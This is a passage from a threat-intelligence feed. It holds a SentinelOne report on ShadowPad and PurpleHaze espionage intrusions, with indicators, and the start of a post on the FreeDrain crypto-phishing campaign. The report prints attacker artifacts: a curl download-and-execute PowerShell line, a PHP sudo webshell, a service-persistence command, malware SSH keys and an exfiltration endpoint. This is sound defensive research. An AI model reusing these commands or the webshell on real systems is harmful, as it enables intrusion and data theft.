C).\nWe do not rule out the involvement of distinct threat groups or the possibility of multiple intrusions conducted by the same threat actor, especially given the widespread use of publicly available tools and the extensive sharing of malware, infrastructure, and operational practices among Chinese threat groups. We also consider the possibility that access may have been transferred between different actors, particularly in light of the suspected involvement of UNC5174.\nTechnical Details | ShadowPad Intrusions\nWe present below technical details on the ShadowPad intrusion into the South Asian government entity in June 2024 (Activity A), as well as on the broader ShadowPad activities that took place between July 2024 and March 2025 (Activity B and C).\nActivity A | ShadowPad and ScatterBrain Obfuscation\nThis intrusion involved the deployment of a ShadowPad sample named AppSov.exe. The threat actor deployed AppSov.exe by executing a PowerShell command that performs the following actions:\nDownloads a file named x.dat from a remote endpoint using curl.exe after a 60-second delay.\nSaves the downloaded file as AppSov.exe in the C:\\ProgramData\\ directory.\nLaunches the executable using the Start-Process PowerShell command.\nReboots the system after a delay of 30 minutes.\n\r\nsleep 60;curl.exe -o c:\\programdata\\AppSov.EXE http://[REDACTED]/dompdf/x.dat;start-process c:\\programdata\\AppSov.EXE;sleep 1800;shutdown.exe -r -t 1 -f;\r\n\nThe endpoint hosting x.dat was a previously compromised system within the same organization. Our analysis revealed that malware artifacts had been deployed on this system approximately one month prior to the ShadowPad deployment. These include the agent component of the Nimbo-C2 open-source remote access framework, as well as a PowerShell script that performs the following actions:\nCollects sensitive user data (documents, credentials, and cryptographic material) by recursively searching C:\\Users\\ for files modified in the previous 600 days and with the following extensions: *.xls, *.xlsx, *.ods, *.txt, *.pem, *.cert, and *.pfx.\nCopies the collected files to a temporary folder at C:\\windows\\vss\\temp.\nArchives the collected files into an archive file named with the system’s MAC address and date, likely for tracking compromised endpoints.\nEncrypts and password-protects the archive using 7-Zip with the password @WsxCFt6&UJMmko0, ensuring the data is obfuscated from inspection.\nExfiltrates the encrypted archive via a curl POST request to a hardcoded URL: https[://]45.13.199[.]209/rss/rss.php.\nRemoves traces by deleting the temporary folder, archive, and DAT files after exfiltration to avoid detection and forensic recovery.\nPowerShell exfiltration script\nThe Nimbo-C2 agent was deployed to C:\\ProgramData\\Prefetch\\PfSvc.exe, likely masquerading as a Privacyware Privatefirewall executable.\nWe have not previously observed the use of Nimbo-C2 or variants of the PowerShell exfiltration script in the context of suspected Chinese APT activity. Previous research has documented the use of Nimbo-C2 in operations attributed to APT-K-47 (also known as Mysterious Elephant), a threat actor believed to originate from South Asia.\nThe deployment of the ShadowPad sample AppSov.exe raises several possibilities:\nthe same threat actor conducted both the earlier activity and the ShadowPad deployment,\naccess was handed off to, or leveraged by, a second actor, or\ntwo distinct actors operated independently within the same environment.\nAppSov.exe was obfuscated using a variant of ScatterBrain. The malware uses the domain news.imaginerjp[.]com and the IP address 65.38.120[.]110 for C2 communication, leveraging DNS over HTTPS (DoH) in an attempt to evade detection by Base-64 encoding queried domains and obscuring DNS traffic from monitoring systems.\n\r\nhttps[://]8.8.8.8//dns-query?dns=AAABAAABAAAAAAAABG5ld3MKaW1hZ2luZXJqcANjb20AAAEAAQ\r\n\nAppSov.exe is obfuscated using dispatcher routines that alter control flow, displacements placed after each invocation of these routines, and opaque predicates. The malware verifies its integrity using the constant values 0x89D17427, 0x254733D6, 0x6FE2CF4E, and 0x110302D6. It is distributed with three modules: one with the ID 0x0A and two with the ID 0x20. The ShadowPad module IDs designate different types of modules, including configuration data or code that implements malware functionalities such as injection or data theft.\nAppSov.exe: ShadowPad module IDs and sizes\nAppSov.exe: Deobfuscated dispatcher routine\nFor a detailed overview of the ScatterBrain obfuscation mechanism and additional ShadowPad implementation details, we refer to previous research by Google Threat Intelligence Group.\nActivity B & C | A Global ShadowPad Operation\nBased on various implementation overlaps with AppSov.exe, including configuration data as well as custom decryption and integrity verification constant values, we identified multiple additional ShadowPad samples obfuscated using ScatterBee variants. This also led to the discovery of related infrastructure, including the ShadowPad C2 servers dscriy.chtq[.]net and updata.dsqurey[.]com, as well as the suspected ShadowPad-related domains network.oossafe[.]com and notes.oossafe[.]com.\nDeobfuscated integrity verification routine in AppSov.exe\nDeobfuscated integrity verification routine in another ShadowPad sample\nSome of the samples we identified differ in execution from AppSov.exe. Instead of embedding the full ShadowPad functionality and configuration within a single executable, they are implemented as Windows DLLs designed to be loaded by specific legitimate executables vulnerable to DLL hijacking. These DLLs then load an external file with an eight-character name and the .tmp extension, for example 1D017DF2.tmp.\nUsing C2 netflow and SentinelOne telemetry data, we identified a broad range of victim organizations compromised by the ShadowPad samples we discovered. Between July 2024 and March 2025, this malware was involved in intrusions at over 70 organizations across multiple regions globally, spanning sectors such as manufacturing, government, finance, telecommunications, and research. Among the victims was the IT services and logistics company that was managing hardware logistics for SentinelOne employees at the time (Activity C).\nGeographical distribution of victims\nWe suspect that the most common initial access vector involved the exploitation of Check Point gateway devices, consistent with previous research on this topic. We also observed communication to ShadowPad C2 servers originating from Fortinet Fortigate, Microsoft IIS, SonicWall, and CrushFTP servers, suggesting potential exploitation of these systems as well.\nTechnical Details | PurpleHaze\nWe present below technical details on intrusions that are part of the PurpleHaze threat cluster: the intrusion into the South Asian government entity in October 2024 (Activity D, the same organization compromised using ShadowPad in June 2024), the reconnaissance of SentinelOne infrastructure in October 2024 (Activity E), and the intrusion into the European media organization in September 2024 (Activity F).\nActivity D | GOREshell & a China-based ORB Network\nIn early October 2024, we detected system reconnaissance and malware deployment activities on a workstation within the South Asian government entity. The threat actor executed the ipconfig Windows command to query network configuration and established a connection to IP address 103.248.61[.]36 on port 443. The adversary then created the C:\\Program Files\\VMware\\VGAuth directory and downloaded an archive file named VGAuth1.zip from 103.248.61[.]36; after extracting its contents into the VGAuth directory, the archive was deleted.\nThe archive file contained two executables: a legitimate VGAuthService.exe executable and a malicious DLL file named glib-2.0.dll (original filename: libglib-2.0-0.dll), which masquerades as a legitimate GLib–2.0 library file.\nVGAuthService.exe implements the VMware Guest Authentication Service. The threat actor deployed version 11.3.5.59284, signed by VMWare and compiled on Tuesday, August 31, 2021, 06:14:07 UTC. This version is vulnerable to DLL hijacking.\nThe threat actor then created a new Windows service named VGAuthService, which automatically starts upon system boot, runs the VGAuthService.exe executable, and displays as Alias Manager and Ticket Service. When the service was started, VGAuthService.exe loaded and executed the malicious glib-2.0.dll library file.\n\r\nsc create VGAuthService binPath= \"\\\"C:\\\\Program Files\\\\VMware\\\\\\VGAuth\\\\VGAuthService.exe\\\"\" start=auto error=ignore displayname=\"Alias Manager and Ticket Service\"\r\n\nglib-2.0.dll implements the GOREshell backdoor, which uses reverse_ssh functionalities to establish SSH connections to attacker-controlled endpoints. The backdoor is implemented in the Go programming language and obfuscated using Garble, including string literals, package paths, and function names. It uses the cgo library to invoke C code.\nglib-2.0.dll: Obfuscated form of the string Fail to detect service: %v\nglib-2.0.dll contains a private SSH key used for establishing SSH connections to the threat actor’s C2 server.\n\r\n-----BEGIN OPENSSH PRIVATE KEY-----\r\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZWQyNTUxOQAAACABqioIxWKMLg7cKJuRt30HFKJuyTBVP7F6c6G7ozrcdwAAAIgRVxQaEVcUGgAAAAtzc2gtZWQyNTUxOQAAACABqioIxWKMLg7cKJuRt30HFKJuyTBVP7F6c6G7ozrcdwAAAECLzCu1ax/sxC6Vvt8/pkE+H2ryf9RtRqsyjs/1cL5k3QGqKgjFYowuDtwom5G3fQcUom7JMFU/sXpzobujOtx3AAAAAAECAwQF\r\n-----END OPENSSH PRIVATE KEY-----\r\n\nThe malware was configured to use downloads.trendav[.]vip for C2 purposes. This domain resolved to 142.93.214[.]219 at the time of the activity. glib-2.0.dll establishes SSH connections over the Websocket protocol (wss[://]downloads.trendav[.]vip:443).\nNetwork request issued by glib-2.0.dll\nThe threat actor deployed GOREshell variants not only on Windows systems but also on Linux. This includes two samples: one masquerading as the snapd Linux service and the other as the update-notifier service. The threat actor deployed both samples as Linux services, which included creating service configuration files, such as /usr/lib/systemd/system/update-notifier.service.\nThe content of update-notifier.service\nIn contrast to update-notifier, which is obfuscated using Garble and packed with UPX, snapd is not obfuscated. Both samples use epp.navy[.]ddns[.]info as their C2 servers and are configured to proxy connections through a local IP address over port 8080. Additionally, both samples store the same private SSH key as glib-2.0.dll.\nBased on the private key stored in glib-2.0.dll, snapd, and update-notifier, we discovered an additional GOREshell variant, which was uploaded on a malware sharing platform in September 2023. This GOREshell variant is implemented as a tapisrv.dll library file (Microsoft Windows Telephony Server) and loaded as a Windows service by the svchost.exe service container process. The malware uses the mail.ccna[.]organiccrap[.]com domain for C2 purposes.\nThe discovery of the tapisrv.dll sample indicates reuse of the private key in intrusions separated by a considerable period.\nPrivate key reuse\nWe associate some of the GOREshell C2 infrastructure with an ORB network, which we track as being operated from China and actively used by several suspected Chinese cyberespionage actors, including overlaps with APT15.\nThe threat actor made significant efforts to obscure their activity and remove evidence of their presence, including timestomping GOREshell executable files and deploying a log removal tool on Linux systems, specifically at the /usr/sbin/mcl filepath.\nOur analysis of mcl suggests that the executable is likely a compiled and modified version of the source code of a tool called clear13, developed by members of The Hacker’s Choice community. The source code of clear13 is publicly available on GitHub.\nThe mcl executable is packed using a custom-modified version of UPX. The tool supports four commands, which are presented to the user through a help menu.\nCommand\nDisplayed help text\nDescription\n\n\nsudo\nsudo cmd\nExecutes a specified command (cmd) with elevated privileges using sudo.\n\n\nclear\nclear name\nRemoves the last entry containing a specified username (name) from /var/log/wtmp, /var/run/utmp, and /var/log/lastlog.\n\n\nsecure\nsecure timeString\nRemoves all entries matching a specified pattern (timeString) from /var/log/secure.\n\n\nhistory\nhistory leftNum\nTruncates the user command history, keeping only a specified number of entries (leftNum).\n\n\n\n\nActivity E | Probing & Reconnaissance of SentinelOne Infrastructure\nIn October 2024, SentinelLABS observed consistent attempts to establish remote connections to multiple Internet-facing SentinelOne servers over port 443 for reconnaissance purposes.\nOur analysis of the infrastructure associated with this activity revealed links to the October 2024 intrusion into the South Asian government entity (Activity D).\nWe identified server characteristics and domain registration patterns suggesting coordinated infrastructure management and bulk domain registration, likely carried out by the same threat actor conducting reconnaissance on SentinelOne infrastructure and involved in Activity D, or by a third-party entity responsible for managing the infrastructure used in both activities.\nThe connections we initially observed originated from a virtual private server (VPS) that used a C2 server as a proxy. At the time of the activity, the server had an IP address of 128.199.124[.]136, which was mapped to the domain name tatacom.duckdns[.]org and is designed to appear as part of a major South Asian telecommunications provider’s infrastructure.\nBased on a unique server fingerprint, SentinelLABS discovered an extensive collection of related network infrastructure.\nInfrastructure overview\nThe C2 domain downloads.trendav[.]vip, observed in Activity D, resolved to the IP address 142.93.214[.]219. We also identified this IP address based on the server fingerprint. Furthermore, the IP address of a server associated with the same fingerprint, 143.244.137[.]54, was mapped to the domain name cloud.trendav[.]co in October 2024. This domain name overlaps with downloads.trendav[.]vip.\nAdditionally, historical domain registration records show that the root domain trendav[.]vip was originally registered through Dynadot Inc., on 24 October 2023, at 13:05:29 UTC. Identifying all domains registered through the same registrar at the exact same date and time (to the second) reveals the domains secmailbox[.]us and sentinelxdr[.]us, the latter of which likely masquerades as SentinelOne infrastructure.\nBetween February and April 2025, the sentinelxdr[.]us domain resolved to 142.93.214[.]219, the same IP address that downloads.trendav[.]vip resolved to in October 2024.\nIn October 2024, mail.secmailbox[.]us resolved to 142.93.212[.]42. Like the server at IP address 142.93.214[.]219 (downloads.trendav[.]vip/sentinelxdr[.]us), this server shared the same server fingerprint.\nFurthermore, domain registration data for sentinelxdr[.]us was updated on 25 September 2024, at 01:43:46 UTC, a date and time that is identical to an update of the registration data of trendav[.]vip.\nActivity F | The Return of dsniff\nThe late September 2024 intrusion into the European media organization showed overlaps in tooling with the October 2024 intrusion into the South Asian government entity (Activity D). These overlaps include the use of the GOREshell backdoor and publicly available tools developed by The Hacker’s Choice community.\nThe threat actor deployed a UPX-packed GOREshell sample, which was configured to use 107.173.111[.]26 over the WebSocket protocol for C2 communication (wss[://]107.173.111[.]26:443). The executable file we retrieved contains a private SSH key and the public SSH key fingerprint f0746e78e49896dfa01c674bf2a800443b1966c54663db5c679bc86533352590.\n\r\n-----BEGIN PRIVATE KEY-----\r\nMC4CAQAwBQYDK2VwBCIEIMsHXDEWgXiPFrIjDOSXZqReC2HHiS6kgoZT0YgHlK87\r\n-----END PRIVATE KEY-----\r\n\nBased on the fingerprint, we identified a Garble-obfuscated GOREshell sample that was uploaded to a malware sharing platform from Iran in late July 2024. This GOREshell sample also contains a private SSH key and is configured to use the same C2 server, 107.173.111[.]26, over the TLS protocol (tls[://]107.173.111[.]26:80).\nThis suggests threat actor activity since at least July 2024, possibly targeting organizations in both Europe and the Middle East.\n\r\n-----BEGIN PRIVATE KEY-----\r\nMC4CAQAwBQYDK2VwBCIEINArpOAwJO2+lv9Da+PzmkbKxGhMcapQ+/NhUq4nifvh\r\n-----END PRIVATE KEY-----\r\n\nThe threat actor also deployed version 2.5a1 of dsniff, a collection of tools for network auditing and penetration testing. With active development of dsniff having been discontinued for over 15 years, our investigation of public source code repositories revealed that the THC community has released version 2.5a1 in an effort to resume active maintenance of the project.\nTo obfuscate their presence, the threat actor timestomped deployed executables, setting their creation date to September 15, 2021. After gaining initial access to the environment, the perpetrators deployed a simple PHP webshell that enables remote command execution by passing commands via the a parameter and executing them with elevated privileges using sudo.\n\r\n<?php system('/bin/sudo '. @$_REQUEST['a']);?>\r\n\nOur investigation of system and network traffic artifacts strongly suggests that the threat actor gained an initial foothold by exploiting CVE-2024-8963 in conjunction with CVE-2024-8190 (both Ivanti Cloud Services Appliance vulnerabilities) on September 5, 2024, a few days before their public disclosure.\nWe track some of the malicious infrastructure used in this attack as part of an ORB network, which we suspect is operated from China and includes compromised network edge devices.\nConclusions\nThis post highlights the persistent threat posed by China-nexus cyberespionage actors to a wide range of industries and public sector organizations, including cybersecurity vendors themselves. The activities detailed in this research reflect the strong interest these actors have in the very organizations tasked with defending digital infrastructure.\nOur findings underscore the critical need for constant vigilance, robust monitoring, and rapid response capabilities. By publicly sharing details of our investigations, we aim to provide insight into the rarely discussed targeting of cybersecurity vendors, helping to destigmatize sharing of IOCs related to these campaigns, and thus contribute to a deeper understanding of the tactics, objectives, and operational patterns of China-nexus threat actors. As these adversaries continue to adapt to our response efforts, it’s essential that defenders prioritize transparency, intelligence sharing, and coordinated action over the fear of reputational harm.\nWe encourage others in the industry to adopt a proactive approach to threat intelligence sharing and defense coordination, recognizing that collective security strengthens the entire community.\nWe are grateful to our partners at Lumen Technologies Black Lotus Labs for their collaboration and support.\nIndicators of Compromise\nSHA-1 Hashes\nValue\nNote\n\n\n106248206f1c995a76058999ccd6a6d0f420461e\nWebshell\n\n\n411180c89953ab5e0c59bd4b835eef740b550823\nGOREshell (snapd)\n\n\n4896cfff334f846079174d3ea2d541eec72690a0\nNimbo-C2 agent (PfSvc.exe)\n\n\n5ee4be6f82a16ebb1cf8f35481c88c2559e5e41a\nShadowPad\n\n\n7dabf87617d646a9ec3e135b5f0e5edae50cd3b9\nGOREshell (update-notifier)\n\n\na31642046471ec138bb66271e365a01569ff8d7f\nGOREshell\n\n\na88f34c0b3a6df683bb89058f8e7a7d534698069\nShadowPad\n\n\naa6a9c25aff0e773d4189480171afcf7d0f69ad9\nShadowPad\n\n\nc43b0006b3f7cd88d31aded8579830168a44ba79\nShadowPad\n\n\ncb2d18fb91f0cd88e82cb36b614cfedf3e4ae49b\nGOREshell (glib-2.0.dll)\n\n\ncbe82e23f8920512b1cf56f3b5b0bca61ec137b9\nLegitimate VMWare executable (VGAuthService.exe)\n\n\nebe6068e2161fe359a63007f9febea00399d7ef3\nGOREshell\n\n\nf52e18b7c8417c7573125c0047adb32d8d813529\nShadowPad (AppSov.exe)\n\n\n\n\nDomains\nValue\nNote\n\n\ncloud.trendav[.]co\nSuspected PurpleHaze infrastructure\n\n\ndownloads.trendav[.]vip\nGOREshell C2 server\n\n\ndscriy.chtq[.]net\nShadowPad C2 server\n\n\nepp.navy[.]ddns[.]info\nGOREshell C2 server\n\n\nmail.ccna[.]organiccrap[.]com\nGOREshell C2 server\n\n\nmail.secmailbox[.]us\nSuspected PurpleHaze infrastructure\n\n\nnetwork.oossafe[.]com\nSuspected ShadowPad C2 server\n\n\nnews.imaginerjp[.]com\nShadowPad C2 server\n\n\nnotes.oossafe[.]com\nSuspected ShadowPad C2 server\n\n\nsecmailbox[.]us\nSuspected PurpleHaze infrastructure\n\n\nsentinelxdr[.]us\nSuspected PurpleHaze infrastructure\n\n\ntatacom.duckdns[.]org\nC2 server\n\n\ntrendav[.]vip\nSuspected PurpleHaze infrastructure\n\n\nupdata.dsqurey[.]com\nShadowPad C2 server\n\n\n\n\nIP Addresses\nValue\nNote\n\n\n103.248.61[.]36\nMalware hosting location\n\n\n107.173.111[.]26\nGOREshell C2 server\n\n\n128.199.124[.]136\nC2 server\n\n\n142.93.212[.]42\nSuspected PurpleHaze infrastructure\n\n\n142.93.214[.]219\nGOREshell C2 server\n\n\n143.244.137[.]54\nSuspected PurpleHaze infrastructure\n\n\n45.13.199[.]209\nExfiltration IP address\n\n\n65.38.120[.]110\nShadowPad C2 server\n\n\n\n\nURLs\nValue\nNote\n\n\nhttps[://]45.13.199[.]209/rss/rss.php\nExfiltration URL","enclosure":{"url":"https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_header-scaled.jpg","length":"283293","type":"image/jpeg"},"dc:creator":"Aleksandar Milenkoski &amp;

What began as an investigation into a single phishing page quickly uncovered a vast, coordinated campaign weaponizing search engine optimization, free-tier web services, and layered redirection techniques to systematically target and drain cryptocurrency wallets at scale.</p>\n<p>In this collaborative blog, we detail the technical anatomy of the FreeDrain operation from the discovery process and infrastructure mapping to evasion techniques and the end-to-end workflow attackers use to funnel victims through multilayered financial theft paths. We also walk through the custom tooling we built to hunt, track, and monitor this large campaign in real time.</p>\n<p>Our findings highlight the growing sophistication of financially motivated threat actors and the systemic risks posed by under-moderated publishing platforms. This research underscores the need for adaptive detection, proactive monitoring, and tighter safeguards across the ecosystem to disrupt threats like FreeDrain before they scale.</p>\n<h2>The Plea for Help</h2>\n<p>Our investigation into what would become the <i>FreeDrain</i> Network began on May 12, 2024, when Validin received a message from a distressed individual who had lost approximately 8 BTC, worth around $500,000 at the time. The victim had unknowingly submitted their wallet seed phrase to a phishing site while attempting to check their wallet balance, after clicking on a highly-ranked search engine result.</p>\n<figure id=\"attachment_121004\" aria-describedby=\"caption-attachment-121004\" style=\"width: 1007px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_9.jpg\" alt=\"Request for help after successful phish\" width=\"1007\" height=\"333\" class=\"size-full wp-image-121004\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_9.jpg 1007w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_9-300x99.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_9-768x254.jpg 768w\" sizes=\"auto, (max-width: 1007px) 100vw, 1007px\" /><figcaption id=\"caption-attachment-121004\" class=\"wp-caption-text\">Request for help after successful phish</figcaption></figure>\n<p>The individual had come across a Validin blog post from April 2024, <a href=\"https://www.validin.com/blog/unmasking-crypto-phishing-websites-with-validin/\" target=\"_blank\" rel=\"noopener noreferrer\">which documented a series of crypto-draining phishing pages</a>. The phishing site they encountered shared striking similarities to the infrastructure we had analyzed—specifically, pages hosted on <code>azurewebsites[.]net</code>, along with additional dedicated domain names.</p>\n<p>Trusted cryptocurrency tracking analysts confirmed that the destination wallet used to receive the victim’s funds was a one-time-use address. The stolen assets were quickly moved through a cryptocurrency mixer, an obfuscation method that fragments and launders funds across multiple transactions, making attribution and recovery nearly impossible.</p>\n<p>While we weren’t able to assist in recovering the lost assets, this outreach marked a turning point. It became clear that the incident was not isolated. We set out to uncover the infrastructure behind the scam and understand the broader operation enabling these thefts to occur at scale.</p>\n<h2>Cracking the Surface – Our First Look at FreeDrain</h2>\n<p>When Valdin published the <a href=\"https://www.validin.com/blog/unmasking-crypto-phishing-websites-with-validin/\" target=\"_blank\" rel=\"noopener noreferrer\">initial findings in April 2024</a>, one key piece of the puzzle remained unclear: how were these phishing pages reaching victims at scale? While common delivery methods like phishing emails, SMS (smishing), social media posts, and blog comment spam are frequently used in cryptocurrency scams, none appeared to be the source in this case.</p>\n<p>That changed with the report from the victim in May. They had encountered the phishing site via a top-ranked search engine result, not a suspicious message or unsolicited link.</p>\n<p>Curious whether we could reproduce the victim’s experience, we conducted a series of keyword searches ourselves. The results were startling.</p>\n<p>Search terms like &#8220;<i>Trezor wallet balance</i>&#8221; returned multiple malicious results across Google, Bing, and DuckDuckGo, often within the first few result pages.</p>\n<p><figure id=\"attachment_121024\" aria-describedby=\"caption-attachment-121024\" style=\"width: 1504px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13.jpg\" alt=\"Trezor Wallet Balance malicious result in DuckDuckGo\" width=\"1504\" height=\"1131\" class=\"size-full wp-image-121024\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13.jpg 1504w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13-300x226.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13-1024x770.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13-768x578.jpg 768w\" sizes=\"auto, (max-width: 1504px) 100vw, 1504px\" /><figcaption id=\"caption-attachment-121024\" class=\"wp-caption-text\">Trezor Wallet Balance malicious result in DuckDuckGo</figcaption></figure><br />\n<figure id=\"attachment_121010\" aria-describedby=\"caption-attachment-121010\" style=\"width: 1498px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3.jpg\" alt=\"Trezor Wallet Balance malicious result in top Bing Search\" width=\"1498\" height=\"1130\" class=\"size-full wp-image-121010\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3.jpg 1498w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3-300x226.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3-1024x772.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3-768x579.jpg 768w\" sizes=\"auto, (max-width: 1498px) 100vw, 1498px\" /><figcaption id=\"caption-attachment-121010\" class=\"wp-caption-text\">Trezor Wallet Balance malicious result in top Bing Search</figcaption></figure><br />\n<figure id=\"attachment_121007\" aria-describedby=\"caption-attachment-121007\" style=\"width: 1142px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_6-e1746193513596.jpg\" alt=\"Trezor Wallet Balance malicious result in Top Google Search result\" width=\"1142\" height=\"774\" class=\"size-full wp-image-121007\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_6-e1746193513596.jpg 1142w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_6-e1746193513596-300x203.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_6-e1746193513596-1024x694.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_6-e1746193513596-768x521.jpg 768w\" sizes=\"auto, (max-width: 1142px) 100vw, 1142px\" /><figcaption id=\"caption-attachment-121007\" class=\"wp-caption-text\">Trezor Wallet Balance malicious result in Top Google Search result</figcaption></figure></p>\n<p>These were not obscure or poorly maintained phishing sites; they were professionally crafted lure pages freely hosted on subdomains of trusted platforms like <code>gitbook.io</code>, <code>webflow.io</code>, and <code>github.io</code>.</p>\n<p>This discovery marked our first real glimpse into the scale and sophistication of the FreeDrain campaign—and raised a host of new questions.

These weren’t complex, multi-layered scams. In most cases, the pages consisted of just a single large image (again, usually a screenshot of a legitimate crypto wallet interface) followed by a few lines of text that offered seemingly helpful instructions, ironically, some even claimed to educate users on how to avoid phishing.</p>\n<p>This type of simplistic, Q&amp;A-style content is well-known in SEO circles for being rewarded by search engine algorithms. Because users often turn to search engines for direct answers, pages that appear to offer guidance, even when malicious, can be algorithmically elevated in rankings, especially when hosted on high-reputation platforms.</p>\n<p>In our early investigation (May–June 2024), we found that many of these lure pages were hosted on services like <code>webflow.io</code> and <code>gitbook.io</code>. Both platforms provide low-friction publishing, enabling anyone to spin up a custom subdomain and publish arbitrary content for free. The subdomains used followed familiar spammer patterns, frequent use of hyphens, deliberate misspellings, and keyword stuffing to manufacture variation and dodge blacklisting.</p>\n<figure id=\"attachment_121012\" aria-describedby=\"caption-attachment-121012\" style=\"width: 717px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_24.jpg\" alt=\"Subdomain naming scheme similarities\" width=\"717\" height=\"426\" class=\"size-full wp-image-121012\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_24.jpg 717w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_24-300x178.jpg 300w\" sizes=\"auto, (max-width: 717px) 100vw, 717px\" /><figcaption id=\"caption-attachment-121012\" class=\"wp-caption-text\">Subdomain naming scheme similarities</figcaption></figure>\n<h3>Generative AI as a Tool for Scale</h3>\n<p>The text on many lure pages bore clear signs of having been generated by large language models. We found copy-paste artifacts that revealed the specific tools used, most notably, strings like &#8220;4o mini&#8221;, a likely reference to OpenAI’s GPT-4o mini model. These telltale traces suggest that FreeDrain operators are leveraging generative AI not only to create scalable content but doing so carelessly at times.</p>\n<figure id=\"attachment_121027\" aria-describedby=\"caption-attachment-121027\" style=\"width: 1239px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_10.jpg\" alt=\"Fake content mistakenly including OpenAI GPT-4o mini reference\" width=\"1239\" height=\"775\" class=\"size-full wp-image-121027\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_10.jpg 1239w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_10-300x188.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_10-1024x641.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_10-768x480.jpg 768w\" sizes=\"auto, (max-width: 1239px) 100vw, 1239px\" /><figcaption id=\"caption-attachment-121027\" class=\"wp-caption-text\">Fake content mistakenly including OpenAI GPT-4o mini reference</figcaption></figure>\n<h3>FreeDrain’s Secret Weapon &#8211; Spamdexing</h3>\n<p>But content alone doesn&#8217;t explain how these pages were getting indexed and ranked above legitimate sources. How were search engines even discovering them?</p>\n<p>The answer came when we identified several indexed URLs pointing back to high-ranking lure pages, and traced them to massive comment spam campaigns. FreeDrain operators appear to be heavily abusing neglected web properties that allow open or weakly-moderated comments, flooding them with links pointing to their lure pages. This old tactic, known as <a href=\"https://blog.sucuri.net/2023/06/spamdexing-what-is-seo-spam.html\" target=\"_blank\" rel=\"noopener noreferrer\">spamdexing</a>, is a well-documented SEO abuse technique, which FreeDrain makes heavy use of as <a href=\"https://www.sentinelone.com/blog/breaking-down-the-seo-poisoning-attack-how-attackers-are-hijacking-search-results/\" target=\"_blank\" rel=\"noopener noreferrer\">one of the ways to</a> attempt to game SEO.</p>\n<p>In one striking example, we found a Korean university photo album page with a single image uploaded over a decade ago, buried under 26,000 comments, nearly all of them containing spam links.</p>\n<figure id=\"attachment_121026\" aria-describedby=\"caption-attachment-121026\" style=\"width: 1023px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_11.jpg\" alt=\"FreeDrain uses large-scale comment spam on poorly-maintained websites to boost the visibility of their lure pages via search engine indexing\" width=\"1023\" height=\"776\" class=\"size-full wp-image-121026\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_11.jpg 1023w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_11-300x228.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_11-768x583.jpg 768w\" sizes=\"auto, (max-width: 1023px) 100vw, 1023px\" /><figcaption id=\"caption-attachment-121026\" class=\"wp-caption-text\">FreeDrain uses large-scale comment spam on poorly-maintained websites to boost the visibility of their lure pages via search engine indexing</figcaption></figure>\n<p>This technique allows FreeDrain to sidestep traditional delivery vectors like phishing emails or malicious ads, instead meeting victims exactly where they’re looking, at the top of trusted search engines.</p>\n<h2>Tracking Search Results</h2>\n<p>Understanding how FreeDrain&#8217;s lure pages consistently climbed to the top of search results became a key investigative goal, and it demanded custom tooling.</p>\n<p>We built a purpose-specific crawler designed solely to emulate search engine queries, navigate through pages of search results, and extract structured data from each result: URLs, page titles, and text content summaries. The goal was to systematically monitor how malicious pages were ranking, shifting, and proliferating over time.</p>\n<p>We ran this system daily across 700 unique keyword permutations, capturing up to 40 pages deep per search query, per search engine. This daily monitoring provided a dynamic, longitudinal view into the visibility of FreeDrain’s infrastructure.</p>\n<h3>The Scale of Abuse</h3>\n<p>After four months of collection, we amassed a dataset of more than 200,000 unique URLs, drawn from topical search results across at least a dozen different publishing platforms that allow users to create custom subdomains. Aggressively filtering, we identified over 38,000 distinct FreeDrain subdomains hosting the lure pages.</p>\n<p>These subdomains appeared on well-known free hosting and publishing platforms, including:</p>\n<ul>\n<li aria-level=\"1\">Gitbook (gitbook.io)</li>\n<li aria-level=\"1\">Webflow (webflow.io)</li>\n<li 